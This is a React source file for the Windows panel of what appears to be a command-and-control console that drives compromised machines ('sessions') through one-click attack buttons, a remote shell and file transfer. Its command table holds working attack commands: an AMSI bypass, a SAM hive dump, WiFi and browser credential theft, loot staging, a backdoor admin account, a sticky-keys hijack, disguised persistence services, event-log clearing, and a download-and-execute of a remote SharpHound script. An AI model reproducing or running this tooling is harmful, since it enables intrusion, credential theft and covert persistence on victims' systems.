import { useState, useRef } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import { Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
         Download, Upload, Copy, CheckCheck, X, ChevronRight,
         Skull, Shield, Key, Globe, Database, Activity } from 'lucide-react'

interface ExecResult { stdout: string; stderr: string; exit_code: number }
interface FileInfo   { name: string; is_dir: boolean; size: number; mod_time: number }
interface LsResp     { path: string; files: FileInfo[] }
interface OutputEntry { cmd: string; result: string; ok: boolean; ts: number }

function fmtBytes(b: number) {
  if (b >= 1<<20) return `${(b/(1<<20)).toFixed(1)}M`
  if (b >= 1024)  return `${(b/1024).toFixed(1)}K`
  return `${b}B`
}
function joinWin(base: string, name: string) {
  return base.replace(/[/\\]+$/, '') + '\\' + name
}

// ─── Windows capability tabs ──────────────────────────────────────────────────

const TABS_WIN = [
  { id:'recon',   label:'🔍 Recon'       },
  { id:'privesc', label:'⬆️ PrivEsc'     },
  { id:'creds',   label:'🔑 Credentials' },
  { id:'network', label:'🌐 Network'     },
  { id:'files',   label:'📁 Files'       },
  { id:'persist', label:'🔒 Persistence' },
  { id:'ad',      label:'🏰 Active Dir'  },
] as const
type WinTab = typeof TABS_WIN[number]['id']

const CAP: Record<WinTab, { icon: string; l: string; c: string }[]> = {
  recon: [
    { icon:'👤', l:'whoami /all',        c:'whoami /all' },
    { icon:'💻', l:'systeminfo',         c:'systeminfo' },
    { icon:'🔧', l:'OS / Patches',       c:'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief' },
    { icon:'👥', l:'Local Users',        c:'net user' },
    { icon:'🔑', l:'Admins',             c:'net localgroup administrators' },
    { icon:'📋', l:'Processes',          c:'tasklist /v' },
    { icon:'🕐', l:'Sched Tasks',        c:'schtasks /query /fo list /v | head -60' },
    { icon:'⚙️', l:'Services',           c:'sc query type= all state= running' },
    { icon:'📦', l:'Installed Software', c:'wmic product get Name,Version /format:csv | head -40' },
    { icon:'🔌', l:'Autorun',            c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
    { icon:'🔒', l:'AV / EDR',           c:'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value' },
    { icon:'📝', l:'Event Log',          c:'wevtutil qe Security /c:10 /f:text /rd:true' },
  ],
  privesc: [
    { icon:'🎭', l:'Privileges',         c:'whoami /priv' },
    { icon:'🔑', l:'Token Info',         c:'whoami /groups /fo list' },
    { icon:'📂', l:'Unquoted Svc Paths', c:'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv """' },
    { icon:'📝', l:'Writable in PATH',   c:'for %A in ("%path:;=";"%") do ( if exist "%~A" ( cacls "%~A" 2>nul | findstr /i "everyone\\|users\\|authenticated" ) )' },
    { icon:'🔧', l:'AlwaysInstallElev',  c:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul' },
    { icon:'🛡️', l:'UAC Level',         c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin' },
    { icon:'📁', l:'Writable Svc Dirs',  c:'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do (icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a)' },
    { icon:'🔐', l:'PS Exec Policy',     c:'powershell -c "Get-ExecutionPolicy -List"' },
    { icon:'💉', l:'PS AMSI Bypass',     c:'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); echo \'AMSI bypassed\'"' },
    { icon:'🎪', l:'Potato Check',       c:'whoami /priv | findstr SeImpersonatePrivilege' },
  ],
  creds: [
    { icon:'🔑', l:'Stored Creds',       c:'cmdkey /list' },
    { icon:'📋', l:'Clipboard',          c:'powershell -c "Get-Clipboard"' },
    { icon:'🌐', l:'IE Saved Creds',     c:'reg query "HKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2" 2>nul' },
    { icon:'🔒', l:'DPAPI Blobs',        c:'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul | head -10' },
    { icon:'🌍', l:'WiFi Passwords',     c:'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")' },
    { icon:'🦊', l:'Firefox Creds',      c:'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul' },
    { icon:'🌐', l:'Chrome Creds',       c:'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul' },
    { icon:'📧', l:'Outlook Creds',      c:'reg query "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles" /s 2>nul | findstr /i "server\\|user\\|pass" | head -20' },
    { icon:'📁', l:'Config Files',       c:'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".config .env .ini password secret" | head -20' },
    { icon:'💀', l:'SAM (Hive)',          c:'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM' },
  ],
  network: [
    { icon:'🌐', l:'IP Config',          c:'ipconfig /all' },
    { icon:'🗺️', l:'ARP Table',         c:'arp -a' },
    { icon:'🔌', l:'Open Ports',         c:'netstat -ano' },
    { icon:'🛤️', l:'Routes',            c:'route print' },
    { icon:'🌍', l:'DNS Cache',          c:'ipconfig /displaydns | head -40' },
    { icon:'🏠', l:'Hosts File',         c:'type C:\\Windows\\System32\\drivers\\etc\\hosts' },
    { icon:'📡', l:'Network Shares',     c:'net share && net use' },
    { icon:'🔍', l:'Live Hosts',         c:'for /L %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i 2>nul | findstr "TTL" && echo 192.168.1.%i UP' },
    { icon:'🔓', l:'Open Shares',        c:'net view /all 2>nul | head -20' },
    { icon:'🛡️', l:'Firewall Rules',    c:'netsh advfirewall firewall show rule name=all | head -60' },
  ],
  files: [
    { icon:'📂', l:'C:\\Users',          c:'dir C:\\Users' },
    { icon:'🗑️', l:'Recycle Bin',       c:'dir /s /b C:\\$Recycle.Bin 2>nul | head -20' },
    { icon:'📄', l:'Recent Docs',        c:'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\ 2>nul | head -20' },
    { icon:'🔍', l:'Find Passwords',     c:'findstr /si "password" C:\\Users\\*\\*.txt C:\\Users\\*\\*.xml C:\\Users\\*\\*.ini 2>nul | head -20' },
    { icon:'📁', l:'Interesting Files',  c:'dir /s /b C:\\Users C:\\inetpub C:\\xampp 2>nul | findstr /i ".kdbx .rdp .key .pem .pfx .p12 .crt .db .sqlite" | head -20' },
    { icon:'💾', l:'Shadow Copies',      c:'vssadmin list shadows 2>nul' },
    { icon:'📤', l:'Stage Loot',         c:'mkdir C:\\Windows\\Temp\\loot 2>nul & xcopy /q /e C:\\Users\\*\\Desktop C:\\Windows\\Temp\\loot\\ 2>nul & echo staged' },
  ],
  persist: [
    { icon:'📝', l:'Run Keys (user)',    c:'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
    { icon:'📝', l:'Run Keys (system)',  c:'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
    { icon:'⏰', l:'Sched Task',         c:'schtasks /create /sc minute /mo 5 /tn "WindowsUpdate" /tr "cmd.exe /c start /min cmd" /f' },
    { icon:'⚙️', l:'New Service',       c:'sc create "WinDefSvc" binPath= "C:\\Windows\\Temp\\phantom.exe" start= auto && sc start WinDefSvc' },
    { icon:'👤', l:'Backdoor User',     c:'net user backdoor P@ssw0rd123! /add && net localgroup administrators backdoor /add && net localgroup "Remote Desktop Users" backdoor /add' },
    { icon:'🔑', l:'Sticky Keys',       c:'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe"' },
    { icon:'📌', l:'Startup Folder',    c:'copy C:\\Windows\\Temp\\phantom.exe "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsDefender.exe"' },
    { icon:'🗑️', l:'Clear Logs',        c:'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared' },
  ],
  ad: [
    { icon:'🏰', l:'Domain Info',       c:'nltest /domain_trusts 2>nul && net view /domain 2>nul' },
    { icon:'👑', l:'Domain Admins',     c:'net group "Domain Admins" /domain 2>nul' },
    { icon:'🖥️', l:'Domain DCs',       c:'nltest /dclist: 2>nul' },
    { icon:'🎫', l:'Kerberoast List',   c:'powershell -c "setspn -Q */* 2>nul | Select-String -Pattern \\"MSSQLSvc|TERMSRV|HTTP|WSMAN|cifs\\""' },
    { icon:'🔍', l:'AD Users',          c:'net user /domain 2>nul | head -40' },
    { icon:'📋', l:'GPO List',          c:'gpresult /R 2>nul | head -40' },
    { icon:'🔓', l:'AS-REP Roastable',  c:'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"' },
    { icon:'🗂️', l:'ADCS (certs)',     c:'certutil -CAInfo 2>nul && certutil -config - -ping 2>nul | head -10' },
    { icon:'🌊', l:'BloodHound (fast)', c:'powershell -c "iex(iwr https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1)" 2>nul || echo needs-internet' },
    { icon:'💰', l:'DCSync Check',      c:'powershell -c "([adsisearcher]\'(objectclass=domaindns)\').FindAll().Properties[\'Name\']"' },
  ],
}

interface Props { onOpenTerminal: (id: string, name: string) => void }

export default function Windows({ onOpenTerminal }: Props) {
  const { data, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const sessions = (data ?? []).filter(s => s.os?.toLowerCase().includes('windows'))

  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [activeTab,  setActiveTab]  = useState<WinTab>('recon')
  const [executing,  setExecuting]  = useState(false)
  const [outputs,    setOutputs]    = useState<OutputEntry[]>([])
  const [customCmd,  setCustomCmd]  = useState('')
  const [copied,     setCopied]     = useState(false)

  // file browser
  const [fsPath,    setFsPath]    = useState('C:\\')
  const [fsData,    setFsData]    = useState<LsResp | null>(null)
  const [fsLoading, setFsLoading] = useState(false)
  const uploadRef = useRef<HTMLInputElement>(null)
  const [uploading, setUploading] = useState(false)
  const [uploadMsg, setUploadMsg] = useState<string | null>(null)

  const selected = sessions.find(s => s.id === selectedId) ?? null

  async function exec(cmd: string, label?: string) {
    if (!selectedId) return
    setExecuting(true)
    try {
      const r = await apiPost<ExecResult>(`/api/sessions/${selectedId}/execute`, { command: cmd })
      const out = (r.stdout || r.stderr || '(no output)').slice(0, 4000)
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0,60), result: out, ok: r.exit_code === 0, ts: Date.now() }, ...prev.slice(0,19)])
    } catch(e) {
      setOutputs(prev => [{ cmd: label ?? cmd.slice(0,60), result: String(e), ok: false, ts: Date.now() }, ...prev.slice(0,19)])
    } finally { setExecuting(false) }
  }

  async function browseFs(path: string) {
    if (!selectedId) return
    setFsLoading(true)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${selectedId}/ls?path=${encodeURIComponent(path)}`)
      setFsPath(ls.path); setFsData(ls)
    } catch(e) { exec(`dir "${path}"`, `dir ${path}`) }
    finally { setFsLoading(false) }
  }

  function downloadFile(path: string) {
    if (!selectedId) return
    window.open(`/api/sessions/${selectedId}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  async function uploadFile(file: File) {
    if (!selectedId) return
    setUploading(true); setUploadMsg(null)
    const form = new FormData(); form.append('file', file); form.append('path', fsPath + '\\' + file.name)
    try {
      const res = await fetch(`/api/sessions/${selectedId}/upload`, { method:'POST', body:form })
      if (!res.ok) throw new Error(await res.text())
      const j = await res.json() as { path: string }
      setUploadMsg(`✓ ${j.path}`); browseFs(fsPath)
    } catch(e) { setUploadMsg(`✗ ${e}`) }
    finally { setUploading(false) }
  }

  return (
    <div className="flex flex-col gap-3 h-full">
      {/* Header */}
      <div className="flex items-center justify-between shrink-0">
        <h2 className="font-bold text-lg flex items-center gap-2 text-text">
          <span className="text-xl">🪟</span> Windows
          <span className="text-muted text-sm font-normal">({sessions.length} device{sessions.length !== 1 ? 's' : ''})</span>
        </h2>
        <button onClick={refresh} className="flex items-center gap-1 text-muted hover:text-text text-[11px] px-2 py-1 rounded border border-border">
          <RefreshCw size={11} /> Refresh
        </button>
      </div>

      <div className="flex gap-3 flex-1 min-h-0">
        {/* Left: device list */}
        <div className="w-52 shrink-0 flex flex-col gap-1">
          <div className="text-[9px] text-muted uppercase tracking-widest mb-1 px-1">Windows Devices</div>
          {sessions.length === 0 ? (
            <div className="bg-surface border border-border rounded-lg p-4 text-center">
              <Monitor size={24} className="text-muted mx-auto mb-2" />
              <p className="text-muted text-[10px]">No Windows sessions</p>
            </div>
          ) : sessions.map(s => (
            <button key={s.id} onClick={() => { setSelectedId(s.id); setOutputs([]) }}
              className={`w-full text-left rounded-lg border p-2.5 transition-all ${selectedId === s.id ? 'border-primary bg-primary/10' : 'border-border bg-surface hover:border-muted'}`}>
              <div className="flex items-center gap-2">
                <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />
                <span className={`text-xs font-bold truncate ${selectedId === s.id ? 'text-primary' : 'text-text'}`}>{s.name}</span>
              </div>
              <div className="text-[9px] text-muted mt-1 pl-3.5 truncate">{s.username}@{s.hostname}</div>
              <div className="text-[9px] text-muted pl-3.5 truncate">{s.remote_address}</div>
            </button>
          ))}
          {selected && (
            <div className="mt-auto pt-2 border-t border-border flex flex-col gap-1">
              <button onClick={() => onOpenTerminal(selected.id, selected.name)}
                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-primary/40 text-primary hover:bg-primary/10 transition-colors text-[11px]">
                <Terminal size={11} /> Open Shell
              </button>
              <button onClick={() => { setActiveTab('files'); browseFs('C:\\Users') }}
                className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded border border-border text-muted hover:border-muted hover:text-text transition-colors text-[11px]">
                <FolderOpen size={11} /> Browse Files
              </button>
            </div>
          )}
        </div>

        {/* Right: capabilities */}
        {!selected ? (
          <div className="flex-1 flex items-center justify-center border border-dashed border-border rounded-lg">
            <div className="text-center">
              <Monitor size={32} className="text-muted mx-auto mb-2" />
              <p className="text-muted text-sm">Select a Windows device</p>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col gap-2 min-h-0">
            {/* Device info */}
            <div className="bg-surface border border-primary/20 rounded-lg px-3 py-2 shrink-0 flex items-center gap-3 flex-wrap">
              <span className="w-2 h-2 rounded-full bg-primary animate-pulse" />
              <span className="text-text font-bold text-sm">{selected.name}</span>
              <span className="text-muted text-[10px] font-mono">{selected.id.slice(0,8)}</span>
              <span className="text-muted text-[10px] bg-surface border border-border px-1.5 py-0.5 rounded">{selected.transport}</span>
              <span className="text-muted text-[10px] ml-auto">{selected.username}@{selected.hostname} · PID {selected.pid}</span>
            </div>

            {/* Tab bar */}
            <div className="flex gap-0.5 overflow-x-auto shrink-0 bg-surface border border-border rounded-lg p-1">
              {TABS_WIN.map(t => (
                <button key={t.id} onClick={() => setActiveTab(t.id)}
                  className={`px-2.5 py-1.5 rounded text-[10px] whitespace-nowrap transition-colors ${activeTab === t.id ? 'bg-primary/20 text-primary font-semibold' : 'text-muted hover:text-text hover:bg-border/30'}`}>
                  {t.label}
                </button>
              ))}
            </div>

            {/* Capabilities */}
            <div className="flex-1 min-h-0 overflow-y-auto">
              {activeTab !== 'files' && (
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-1.5 p-1">
                  {CAP[activeTab].map(c => (
                    <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
                      className="flex items-start gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-primary/40 hover:bg-primary/5 transition-colors disabled:opacity-40 text-left">
                      <span className="text-sm shrink-0 mt-0.5">{c.icon}</span>
                      <span className="text-[10px] text-muted leading-tight">{c.l}</span>
                    </button>
                  ))}
                </div>
              )}

              {activeTab === 'files' && (
                <div className="flex flex-col gap-2 p-1">
                  <div className="flex items-center gap-2">
                    <input value={fsPath} onChange={e => setFsPath(e.target.value)}
                      onKeyDown={e => e.key === 'Enter' && browseFs(fsPath)}
                      className="flex-1 bg-bg border border-border rounded px-2 py-1.5 text-[11px] font-mono text-text focus:border-primary outline-none" />
                    <button onClick={() => browseFs(fsPath)} disabled={fsLoading}
                      className="px-3 py-1.5 rounded bg-primary/10 border border-primary/40 text-primary text-[11px] disabled:opacity-40">
                      {fsLoading ? <Loader size={11} className="animate-spin" /> : 'Go'}
                    </button>
                    {/* Quick paths */}
                    {['C:\\', 'C:\\Users', 'C:\\Windows\\Temp', 'C:\\inetpub'].map(p => (
                      <button key={p} onClick={() => { setFsPath(p); browseFs(p) }}
                        className="px-2 py-1.5 rounded border border-border text-muted text-[9px] hover:border-primary hover:text-primary transition-colors whitespace-nowrap">
                        {p.split('\\').pop() || p}
                      </button>
                    ))}
                    <input ref={uploadRef} type="file" className="hidden"
                      onChange={e => e.target.files?.[0] && uploadFile(e.target.files[0])} />
                    <button onClick={() => uploadRef.current?.click()} disabled={uploading}
                      className="px-2 py-1.5 rounded border border-border text-muted text-[11px] flex items-center gap-1 hover:border-muted disabled:opacity-40">
                      <Upload size={10} /> {uploading ? '…' : 'Upload'}
                    </button>
                  </div>
                  {uploadMsg && <div className={`text-[10px] px-2 ${uploadMsg.startsWith('✓') ? 'text-primary' : 'text-danger'}`}>{uploadMsg}</div>}
                  {fsData && (
                    <div className="border border-border rounded-lg overflow-hidden max-h-64 overflow-y-auto">
                      <button onClick={() => { const p = fsPath.replace(/[/\\]+$/, '').replace(/\\[^\\]+$/, '') || 'C:\\'; browseFs(p) }}
                        className="w-full flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/40 text-[11px] text-muted">
                        ⬆ ..
                      </button>
                      {fsData.files.filter(f => f.name !== '.' && f.name !== '..').map(f => (
                        <div key={f.name} className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20 text-[11px]">
                          <span>{f.is_dir ? '📁' : '📄'}</span>
                          <button onClick={() => f.is_dir ? browseFs(joinWin(fsPath, f.name)) : void 0}
                            className={`flex-1 font-mono text-left truncate ${f.is_dir ? 'text-accent hover:text-primary cursor-pointer' : 'text-text'}`}>
                            {f.name}
                          </button>
                          <span className="text-[9px] text-muted shrink-0">{f.is_dir ? 'dir' : fmtBytes(f.size)}</span>
                          {!f.is_dir && (
                            <button onClick={() => downloadFile(joinWin(fsPath, f.name))} title="Download"
                              className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] border border-primary/30 text-primary hover:bg-primary/10 transition-colors shrink-0">
                              <Download size={9} /> DL
                            </button>
                          )}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>

            {/* Custom command */}
            <div className="flex gap-2 shrink-0">
              <input value={customCmd} onChange={e => setCustomCmd(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
                disabled={executing}
                placeholder="Custom command (cmd.exe /c, powershell -c, etc.)…"
                className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-primary outline-none" />
              <button onClick={() => { if (customCmd.trim()) { exec(customCmd); setCustomCmd('') } }}
                disabled={executing || !customCmd.trim()}
                className="px-3 py-2 rounded bg-primary/10 border border-primary/40 text-primary hover:bg-primary/20 disabled:opacity-40">
                {executing ? <Loader size={13} className="animate-spin" /> : <Send size={13} />}
              </button>
            </div>

            {/* Output */}
            {outputs.length > 0 && (
              <div className="shrink-0 border border-border rounded-lg overflow-hidden bg-bg" style={{ maxHeight: 200 }}>
                <div className="flex items-center justify-between px-3 py-1.5 bg-surface border-b border-border text-[10px]">
                  <div className="flex items-center gap-2">
                    <Activity size={10} className="text-primary" />
                    <span className={outputs[0].ok ? 'text-primary' : 'text-danger'}>{outputs[0].ok ? '✓' : '✗'}</span>
                    <span className="text-muted font-mono truncate max-w-[300px]">{outputs[0].cmd}</span>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <button onClick={() => { navigator.clipboard.writeText(outputs[0].result); setCopied(true); setTimeout(() => setCopied(false), 1500) }}>
                      {copied ? <CheckCheck size={11} className="text-primary" /> : <Copy size={11} className="text-muted hover:text-text" />}
                    </button>
                    <button onClick={() => setOutputs([])}><X size={11} className="text-muted hover:text-danger" /></button>
                  </div>
                </div>
                <pre className="px-3 py-2 text-[11px] font-mono text-text whitespace-pre-wrap break-all overflow-y-auto" style={{ maxHeight: 160 }}>
                  {outputs[0].result}
                </pre>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  )
}
